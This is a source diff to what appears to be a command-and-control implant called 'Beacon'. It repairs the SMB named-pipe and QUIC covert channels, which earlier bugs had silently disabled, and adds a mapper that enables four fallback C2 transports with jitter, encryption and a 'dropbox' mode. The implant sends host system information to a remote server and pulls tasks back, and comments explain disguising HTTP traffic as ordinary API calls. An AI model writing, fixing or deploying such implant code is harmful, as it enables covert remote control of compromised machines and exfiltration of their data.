@@ -450,6 +450,13 @@ def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> by
 
 # ── Stdlib DNS resolver (TXT + A records) ──
 
+# The resolver port. Named rather than written into the sendto call so a
+# test can point this at a listener on a free port: binding 53 needs root,
+# and in production dockerd or systemd owns it and forwards to an
+# unprivileged listener, so nothing here ever binds it either.
+_DNS_PORT = 53
+
+
 def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
     """Minimal DNS query using raw UDP sockets. Returns list of strings (TXT) or IPs (A)."""
     qtypes = {"A": 1, "TXT": 16}
@@ -470,7 +477,7 @@ def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(timeout)
     try:
-        sock.sendto(packet, (server, 53))
+        sock.sendto(packet, (server, _DNS_PORT))
         data, _ = sock.recvfrom(4096)
     finally:
         sock.close()
@@ -530,6 +537,40 @@ def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
             results.append(b"".join(txt_parts).decode("utf-8", errors="replace"))
 
     return results
+
+
+# The four channels a beacon can use, and the one place the config file is
+# mapped onto them. `main.py` and `beacon_standalone.py` each used to build
+# this dictionary by hand, and each listed https and dns only -- so `smb`
+# and `quic` in a config file never reached the beacon, and the only way
+# to switch either on was to construct a Beacon in Python. Two copies of
+# one mapping, both missing the same half, is how that survived.
+_FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic")
+
+
+def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True) -> dict:
+    """Build a Beacon config from a `c2` block of `configs/raccoon.yaml`.
+
+    Reads `c2.fallback.*`, which is the **beacon** side of the file: the
+    channels an implant on this host will try. `c2.listeners` is the
+    server side and is read by `listeners.registry` instead.
+
+    A transport absent from the file becomes an empty mapping, which the
+    beacon reads as disabled. That is why this cannot simply pass the
+    fallback block through: the beacon expects its transports at the top
+    of its own `c2` block, not nested under `fallback`.
+    """
+    fallback = c2_cfg.get("fallback") or {}
+    block = {
+        "beacon_interval_seconds": c2_cfg.get("beacon_interval_seconds", 300),
+        "jitter_percent": c2_cfg.get("jitter_percent", 20),
+        "encryption_key": c2_cfg.get("encryption_key", ""),
+        "proxy": c2_cfg.get("proxy", {}),
+        "dropbox": dropbox,
+    }
+    for transport in _FALLBACK_TRANSPORTS:
+        block[transport] = fallback.get(transport, {})
+    return {"c2": block}
 
 
 # ── Stdlib HTTP client ──
@@ -1410,6 +1451,21 @@ class Beacon:
     # ── Crypto ──
 
     def _encrypt(self, data: dict) -> str:
+        # The parameter is a dict and nothing else. Three callers used to
+        # hand this an already-serialised value, and both ways of being
+        # wrong were invisible: bytes raised TypeError from inside
+        # json.dumps and the caller's `except` discarded it, so the SMB and
+        # QUIC transports never put a byte on the wire; a str would have
+        # been serialised a second time, and the far side would have
+        # decrypted a string where it expected a dict, with no error
+        # anywhere. The type hint said dict all along -- this makes it true
+        # at the boundary, so a future caller finds out immediately.
+        # The message names the type and never the value: the argument is
+        # plaintext about to be encrypted.
+        if not isinstance(data, dict):
+            raise TypeError(
+                "_encrypt(data) takes a dict, not %s -- pass the mapping, "
+                "not a serialised form of it" % type(data).__name__)
         plaintext = json.dumps(data, separators=(",", ":")).encode()
         nonce = os.urandom(12)
         ct = _aes_gcm_encrypt(self._key, nonce, plaintext)
@@ -1821,7 +1877,7 @@ class Beacon:
             sock.connect((host, port))
 
             # SMB2 Negotiate
-            neg = self._smb2_negotiate()
+            neg = self._smb2_negotiate_request()
             sock.sendall(self._smb_netbios_wrap(neg))
             resp = self._smb_recv(sock)
             if not resp or resp[12:14] != b"\x00\x00":
@@ -1838,7 +1894,7 @@ class Beacon:
             self._smb_session_id = resp[44:52]
 
             # SMB2 Tree Connect to IPC$
-            tree = self._smb2_tree_connect(host)
+            tree = self._smb2_tree_connect_request(host)
             sock.sendall(self._smb_netbios_wrap(tree))
             resp = self._smb_recv(sock)
             if not resp:
@@ -1882,7 +1938,16 @@ class Beacon:
         except Exception:
             return None
 
-    def _smb2_negotiate(self) -> bytes:
+    def _smb2_negotiate_request(self) -> bytes:
+        # The `_request` suffix is not decoration. This method and
+        # `_smb2_tree_connect_request` below used to be called
+        # `_smb2_negotiate` and `_smb2_tree_connect`, which are also the
+        # names of the smbloot helpers further down this class -- and those
+        # come later, so they won. `_smb_connect` called them with the
+        # wrong arguments, raised TypeError on its first real statement,
+        # caught it, logged at debug level and returned None: the SMB C2
+        # transport could never connect, and said nothing about it. A test
+        # now walks the project for any name bound twice in one scope.
         hdr = b"\xfeSMB"
         hdr += struct.pack("<H", 64)         # StructureSize
         hdr += struct.pack("<H", 0)          # CreditCharge
@@ -1928,7 +1993,7 @@ class Beacon:
         body += ntlm
         return hdr + body
 
-    def _smb2_tree_connect(self, host: str) -> bytes:
+    def _smb2_tree_connect_request(self, host: str) -> bytes:
         hdr = self._smb2_header(3, 0)       # Command: TREE_CONNECT
         path = f"\\\\{host}\\IPC$".encode("utf-16-le")
         body = struct.pack("<H", 9)          # StructureSize
@@ -2026,13 +2091,23 @@ class Beacon:
         if not sock:
             return None
         try:
-            agent = self._agent_id or self._implant_id
-            payload = self._encrypt(json.dumps({
-                "action": "beacon" if self._registered else "register",
-                "agent_id": agent,
-                **self._system_info(),
-            }).encode())
-            if not self._smb_write_pipe(sock, payload.encode() if isinstance(payload, str) else payload):
+            # No decoy envelope here. _wrap_payload exists to make an HTTP
+            # request body look like ordinary API traffic; a named pipe
+            # write carries raw bytes with no JSON body for an inspector to
+            # read, so the envelope would add length and buy nothing -- and
+            # the listener would have to unwrap it again.
+            #
+            # _system_info() carries both "id" (the implant id, always set)
+            # and "agent_id" (None until the server assigns one), so it is
+            # the only thing that needs to go in. There used to be an
+            # explicit "agent_id": self._agent_id or self._implant_id above
+            # the spread, which the spread then overwrote on every call --
+            # dead, and misleading about what identifies a beacon on first
+            # contact. _beacon_https builds its payload the same way.
+            payload = self._encrypt(dict(self._system_info(),
+                                         action="beacon" if self._registered
+                                         else "register"))
+            if not self._smb_write_pipe(sock, payload.encode()):
                 return None
             resp_data = self._smb_read_pipe(sock)
             if not resp_data:
@@ -2068,8 +2143,9 @@ class Beacon:
             }
             if data:
                 result["data"] = data
-            payload = self._encrypt(json.dumps(result).encode())
-            self._smb_write_pipe(sock, payload.encode() if isinstance(payload, str) else payload)
+            # Same reasoning as the check-in above: no envelope on a pipe.
+            payload = self._encrypt(result)
+            self._smb_write_pipe(sock, payload.encode())
             self._smb_read_pipe(sock)
         except Exception as e:
             logger.debug("SMB result send failed: %s", e)
@@ -2090,9 +2166,10 @@ class Beacon:
                 host, port = host.rsplit(":", 1)
                 port = int(port)
 
-            payload = self._encrypt(json.dumps(data).encode())
-            if isinstance(payload, str):
-                payload = payload.encode()
+            # No envelope on a datagram either: there is no HTTP body to
+            # disguise, and the frame header below already describes the
+            # length the receiver needs.
+            payload = self._encrypt(data).encode()
 
             # Frame: [4-byte length][payload]
             frame = struct.pack(">I", len(payload)) + payload
@@ -2152,12 +2229,12 @@ class Beacon:
             return None
 
     def _beacon_quic(self) -> Optional[dict]:
-        agent = self._agent_id or self._implant_id
-        return self._quic_send({
-            "action": "beacon" if self._registered else "register",
-            "agent_id": agent,
-            **self._system_info(),
-        })
+        # Same shape as _beacon_smb and _beacon_https: _system_info()
+        # already carries "id" and "agent_id", and an explicit agent_id
+        # above the spread was dead code.
+        return self._quic_send(dict(self._system_info(),
+                                    action="beacon" if self._registered
+                                    else "register"))
 
     def _send_result_quic(self, task_id: str, status: str, output: str,
                           data: Optional[dict] = None):
